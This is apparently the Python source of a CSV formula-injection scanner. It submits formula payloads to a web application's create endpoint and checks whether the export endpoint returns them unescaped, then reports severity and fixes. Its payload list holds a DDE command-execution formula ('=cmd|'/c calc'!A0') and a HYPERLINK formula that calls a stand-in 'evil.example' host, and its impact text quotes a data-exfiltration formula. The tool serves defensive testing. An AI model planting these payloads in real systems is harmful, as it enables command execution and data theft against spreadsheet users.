"""CSV / formula injection probe.

Workflow:

1. Caller provides a `setup_url` (POST endpoint that creates an
   object) + `field_map` (the form/JSON fields the object accepts)
   + `export_url` (GET endpoint that produces a CSV containing the
   stored value).
2. For each formula-prefix payload class (`=`, `@`, `+`, `-`),
   construct a nonce-tagged payload (e.g. `=cmd|'/c calc'!A0|strix-<n>`).
3. Submit each via the setup endpoint, then fetch the export.
4. **Zero-FP detector**: the formula-prefix payload's exact bytes
   must appear in the export CSV. If yes, the round-trip preserved
   the formula → spreadsheet would execute it on open.

Skip / soft-fail:

- `setup_url` non-2xx (object creation failed) → inconclusive.
- `export_url` non-2xx (export endpoint failed) → inconclusive.
- Export `Content-Type` not `text/csv` / `application/csv` → low
  confidence; still emits but flags `content_type_mismatch`.
- Cluster-A `--exclude-path` blocks either URL → graceful no-op.

**Caveat**: this tool DISPATCHES state-changing requests to the
setup endpoint. Don't run against production — use staging /
dedicated test account. Each probe artifact is nonce-tagged so
test data is auditable / cleanable.

Severity:

- **Medium** (CWE-1236, CSV-injection) when the formula prefix is
  preserved AND the export is `text/csv`/`application/csv` —
  byte-exact match means the exfil works.
- **Low** (CWE-1236) when the formula prefix is preserved BUT the
  export Content-Type is something other than CSV (the probe
  fired against a download that may not be opened in a
  spreadsheet — still a sanitisation gap, lower exploit chance).

Each finding carries `description_plain` + `recommended_action`
(prefix `'`/`"`/`\\t` to round-tripped fields server-side; or use
a dedicated CSV writer that escapes formula prefixes; or set
`Content-Disposition: attachment` so the user is forced to
explicitly open in spreadsheet, raising the bar) and
`verification_status=verified` since byte-exact match is
deterministic.
"""

from __future__ import annotations

import json
import logging
import secrets
from typing import Any
from urllib.parse import urlencode, urlparse

from strix.tools.registry import register_tool


logger = logging.getLogger(__name__)
_TOOL_NAME = "csv_injection_check"
_DEFAULT_TIMEOUT = 10.0
_MAX_RESPONSE_SCAN = 256 * 1024


# Formula-prefix payload classes. Each is a tuple
# (prefix, payload_template, label, severity_kicker).
# The payload template embeds {nonce} so each probe is identifiable
# and re-runs are clean.
_PAYLOADS: tuple[tuple[str, str, str], ...] = (
    # equals = the most-classic CSV-injection prefix.
    ("=", "=cmd|'/c calc'!A0|strix-{nonce}", "equals_cmd_injection"),
    # @ — Google Sheets / LibreOffice variant.
    ("@", "@SUM(1+1)|strix-{nonce}", "at_sign_sum"),
    # + — plus-prefixed formulas auto-execute in newer Excel.
    ("+", "+1+1|strix-{nonce}", "plus_arithmetic"),
    # - — minus-prefixed.
    ("-", "-1+1|strix-{nonce}", "minus_arithmetic"),
    # =HYPERLINK — exfil-via-DNS pattern.
    ("=", "=HYPERLINK(\"http://strix-{nonce}.evil.example/x\",\"x\")",
     "hyperlink_exfil"),
)


# ---------------------------------------------------------------------------
# HTTP fetch (cluster-A composing)
# ---------------------------------------------------------------------------


def _http_request(
    method: str,
    url: str,
    *,
    headers: dict[str, str] | None = None,
    body: str = "",
    timeout: float = _DEFAULT_TIMEOUT,
) -> dict[str, Any]:
    headers = dict(headers or {})

    try:
        from strix.tools.proxy.proxy_manager import get_proxy_manager

        manager = get_proxy_manager()
    except Exception:  # noqa: BLE001
        manager = None
    if manager is not None:
        try:
            r = manager.send_simple_request(
                method, url, headers=headers, body=body, timeout=int(timeout)
            )
            if r.get("skipped"):
                return {"status": 0, "headers": {}, "body": "", "skipped": True}
            return {
                "status": int(r.get("status_code") or 0),
                "headers": _lower_keys(r.get("headers") or {}),
                "body": (r.get("body") or "")[:_MAX_RESPONSE_SCAN],
            }
        except Exception:  # noqa: BLE001
            logger.debug("proxy send_simple_request failed; falling back", exc_info=True)

    try:
        import httpx

        from strix.tools.proxy.http_safety import (
            inject_auth_headers,
            is_path_excluded,
            throttle_for_rate_limit,
        )

        excluded, _ = is_path_excluded(url)
        if excluded:
            return {"status": 0, "headers": {}, "body": "", "skipped": True}
        merged = inject_auth_headers(headers)
        throttle_for_rate_limit()
        with httpx.Client(timeout=timeout, follow_redirects=False, verify=False) as c:
            content = body.encode("utf-8") if body else None
            r = c.request(method, url, headers=merged, content=content)
            return {
                "status": r.status_code,
                "headers": _lower_keys(dict(r.headers)),
                "body": r.text[:_MAX_RESPONSE_SCAN],
            }
    except Exception as e:  # noqa: BLE001
        return {"status": 0, "headers": {}, "body": "", "error": str(e)}


def _lower_keys(headers: dict[str, Any]) -> dict[str, str]:
    return {str(k).lower(): str(v) for k, v in headers.items()}


def _normalize_target(target: str) -> str | None:
    if not isinstance(target, str):
        return None
    target = target.strip()
    if not target:
        return None
    if "://" not in target:
        target = f"https://{target}"
    parsed = urlparse(target)
    if parsed.scheme not in ("http", "https"):
        return None
    if not parsed.netloc:
        return None
    return target


def _build_body(
    fields: dict[str, str], content_type: str,
) -> tuple[str, str]:
    if content_type and "json" in content_type.lower():
        return (json.dumps(fields), "application/json")
    return (urlencode(fields), content_type or "application/x-www-form-urlencoded")


# ---------------------------------------------------------------------------
# Tracer integration
# ---------------------------------------------------------------------------


def _emit_finding(
    *,
    title: str,
    severity: str,
    target: str,
    endpoint: str,
    description: str,
    description_plain: str,
    recommended_action: str,
) -> None:
    try:
        from strix.telemetry.tracer import get_global_tracer
    except ImportError:
        return
    tracer = get_global_tracer()
    if tracer is None:
        return
    tracer.add_vulnerability_report(
        title=title,
        severity=severity,
        category="csv_formula_injection",
        cwe="CWE-1236",  # Improper Neutralization of Formula Elements in CSV File
        target=target,
        endpoint=endpoint,
        description=description,
        impact=(
            "CSV injection (a.k.a. formula injection) lets an attacker "
            "embed spreadsheet formulas in user-supplied data that "
            "round-trips into a CSV export. When the victim opens the "
            "downloaded CSV in Excel / LibreOffice / Google Sheets, "
            "the formula executes — exfiltrating data via "
            "`=HYPERLINK(\"http://attacker/?d=\"&A1)`, hijacking "
            "the spreadsheet via `=cmd|...`, or running arbitrary "
            "calculations the user assumed were inert."
        ),
        remediation_steps=recommended_action,
        description_plain=description_plain,
        recommended_action=recommended_action,
        verification_status="verified",
    )


def _start_check(category: str, surface: str) -> str | None:
    try:
        from strix.telemetry.tracer import get_global_tracer
    except ImportError:
        return None
    t = get_global_tracer()
    if t is None:
        return None
    return t.start_check(category=category, surface=surface, tool=_TOOL_NAME)


def _complete_check(check_id: str | None, result: str, evidence: str) -> None:
    if not check_id:
        return
    try:
        from strix.telemetry.tracer import get_global_tracer
    except ImportError:
        return
    t = get_global_tracer()
    if t is None:
        return
    t.complete_check(check_id, result=result, evidence=evidence)


# ---------------------------------------------------------------------------
# Public tool
# ---------------------------------------------------------------------------


@register_tool(
    sandbox_execution=True,
    mitre_techniques=["T1190"],
)
def csv_injection_check(  # noqa: PLR0913
    setup_url: str,
    export_url: str,
    fields: dict[str, str] | None = None,
    target_field: str = "name",
    setup_method: str = "POST",
    setup_content_type: str = "application/x-www-form-urlencoded",
    export_method: str = "GET",
    cookies: dict[str, str] | None = None,
    extra_headers: dict[str, str] | None = None,
    timeout: float = _DEFAULT_TIMEOUT,
) -> dict[str, Any]:
    """Probe an export endpoint for CSV / formula injection.

    Workflow per probe:
        1. POST to `setup_url` with the formula-prefix payload in
           `fields[target_field]` (other fields kept as supplied).
        2. GET `export_url`.
        3. Check whether the EXACT formula payload is present
           byte-for-byte in the export response body.

    Args:
        setup_url: endpoint that creates / updates the object whose
            `target_field` is reflected in the export.
        export_url: endpoint that returns the CSV containing the
            stored value.
        fields: form / JSON fields sent to setup_url. Default empty.
        target_field: which field receives the formula payload
            (default "name"). Caller chooses based on what's known
            to round-trip.
        setup_method: HTTP method for the setup. Default `POST`.
        setup_content_type: `application/x-www-form-urlencoded`
            (default) or `application/json`.
        export_method: HTTP method for the export. Default `GET`.
        cookies / extra_headers: passed through.
        timeout: per-probe timeout.

    Returns:
        {
          success, setup_url, export_url, target_field,
          export_content_type, probes: [{label, payload,
            setup_status, export_status, payload_in_export,
            severity}, ...], findings_emitted, inconclusive?, reason?
        }

    Findings:
        - **Medium** CWE-1236 — payload present byte-exact in export
          AND export is `text/csv` / `application/csv`.
        - **Low** CWE-1236 — payload present but export Content-Type
          isn't CSV (still a sanitisation gap; lower exploit chance).

    Notes:
        - **DISPATCHES state-changing requests** to setup_url. Use
          staging or dedicated test account.
        - All probe artifacts get a unique `strix-<nonce>-` prefix
          for log auditability + cleanability.
        - `verification_status=verified` because the byte-exact
          match is a deterministic signal.
        - Composes with cluster-A safety; `--exclude-path` skips.
    """
    setup_norm = _normalize_target(setup_url)
    if setup_norm is None:
        return {"success": False, "error": f"invalid setup_url: {setup_url!r}"}
    export_norm = _normalize_target(export_url)
    if export_norm is None:
        return {"success": False, "error": f"invalid export_url: {export_url!r}"}

    target_host = (urlparse(setup_norm).hostname or "").lower()
    if not target_host:
        return {"success": False, "error": f"could not resolve hostname from {setup_url!r}"}

    fields = dict(fields or {})
    cookies = dict(cookies or {})
    extra_headers = dict(extra_headers or {})

    cev = _start_check("csv_formula_injection", target_host)

    base_headers: dict[str, str] = dict(extra_headers)
    if cookies:
        base_headers["Cookie"] = "; ".join(f"{k}={v}" for k, v in cookies.items())

    probes: list[dict[str, Any]] = []
    findings_emitted = 0
    seen_severities: set[str] = set()
    export_content_type: str | None = None

    for prefix, payload_tpl, label in _PAYLOADS:
        nonce = secrets.token_hex(4)
        payload = payload_tpl.format(nonce=nonce)
        probe_fields = dict(fields)
        probe_fields[target_field] = payload

        probe_record: dict[str, Any] = {
            "label": label,
            "prefix": prefix,
            "payload": payload,
            "nonce": nonce,
            "setup_status": 0,
            "export_status": 0,
            "payload_in_export": False,
            "severity": None,
        }

        # ---- Setup ----
        setup_body, used_ct = _build_body(probe_fields, setup_content_type)
        setup_headers = dict(base_headers)
        if used_ct:
            setup_headers["Content-Type"] = used_ct

        setup_response = _http_request(
            setup_method, setup_norm,
            headers=setup_headers, body=setup_body, timeout=timeout,
        )
        if setup_response.get("skipped"):
            probe_record["skipped"] = "exclude_path"
            probes.append(probe_record)
            continue

        setup_status = int(setup_response.get("status") or 0)
        probe_record["setup_status"] = setup_status

        if not (200 <= setup_status < 400):
            probe_record["skipped"] = f"setup_status_{setup_status}"
            probes.append(probe_record)
            continue

        # ---- Export ----
        export_response = _http_request(
            export_method, export_norm,
            headers=base_headers, timeout=timeout,
        )
        if export_response.get("skipped"):
            probe_record["skipped"] = "exclude_path_export"
            probes.append(probe_record)
            continue

        export_status = int(export_response.get("status") or 0)
        probe_record["export_status"] = export_status
        if not (200 <= export_status < 400):
            probe_record["skipped"] = f"export_status_{export_status}"
            probes.append(probe_record)
            continue

        export_body = export_response.get("body") or ""
        export_content_type = (
            (export_response.get("headers") or {}).get("content-type") or ""
        ).lower()

        # ---- Zero-FP detector: byte-exact match ----
        in_export = payload in export_body
        probe_record["payload_in_export"] = in_export

        if not in_export:
            probes.append(probe_record)
            continue

        # ---- Severity selection ----
        is_csv_content_type = (
            "text/csv" in export_content_type
            or "application/csv" in export_content_type
        )
        severity = "medium" if is_csv_content_type else "low"
        probe_record["severity"] = severity

        # Per-severity dedup so all 5 payload classes land at most
        # 2 findings (medium + low if content-type varies between
        # responses, which is rare).
        dedup_key = severity
        if dedup_key in seen_severities:
            probes.append(probe_record)
            continue
        seen_severities.add(dedup_key)

        if severity == "medium":
            description_plain = (
                "Your export endpoint round-trips formula-prefix "
                "characters (=, @, +, -) into a CSV. When a user "
                "opens the downloaded CSV in Excel / LibreOffice / "
                "Google Sheets, the formula executes — leaking data "
                "via HYPERLINK, running arbitrary calculations, or "
                "(in older Excel configs) shelling out via `=cmd|...`."
            )
        else:
            description_plain = (
                "Your export endpoint preserves formula-prefix "
                "characters in the downloaded artifact. The Content-"
                "Type isn't CSV, so the spreadsheet-execution path "
                "isn't immediate, but the sanitisation gap is real "
                "— if the export is later imported into a "
                "spreadsheet (e.g. opened with `Get External Data`), "
                "the formula fires."
            )

        recommended_action = (
            "Sanitise round-tripped fields server-side before "
            "writing to the CSV. Standard fix: prefix each field "
            "value that starts with `=`, `@`, `+`, `-`, `\\t`, "
            "or `\\r` with a single quote (`'`). The Python "
            "stdlib `csv.writer` does NOT sanitise this — you "
            "need an explicit prefix step. Alternative: use a "
            "library that knows about CSV-injection (e.g. "
            "`defusedcsv`, OWASP Java Encoder for Excel). Pair "
            "with `Content-Disposition: attachment; filename=...` "
            "so the user has to explicitly choose to open in a "
            "spreadsheet."
        )

        _emit_finding(
            title=(
                f"CSV formula injection on export endpoint "
                f"({target_host}/{label})"
            ),
            severity=severity,
            target=target_host,
            endpoint=export_norm,
            description=(
                f"Probe `{label}` submitted payload "
                f"`{payload!r}` to `{setup_norm}` field "
                f"`{target_field}`; export endpoint `{export_norm}` "
                f"returned the EXACT payload bytes in the response "
                f"body. Content-Type: `{export_content_type}`."
            ),
            description_plain=description_plain,
            recommended_action=recommended_action,
        )
        findings_emitted += 1

        probes.append(probe_record)

    _complete_check(
        cev,
        result="vulnerable" if findings_emitted else "not_vulnerable",
        evidence=(
            f"{findings_emitted} CSV-injection finding(s); "
            f"export Content-Type: {export_content_type}"
        ),
    )

    return {
        "success": True,
        "setup_url": setup_norm,
        "export_url": export_norm,
        "target_field": target_field,
        "export_content_type": export_content_type,
        "probes": probes,
        "findings_emitted": findings_emitted,
    }
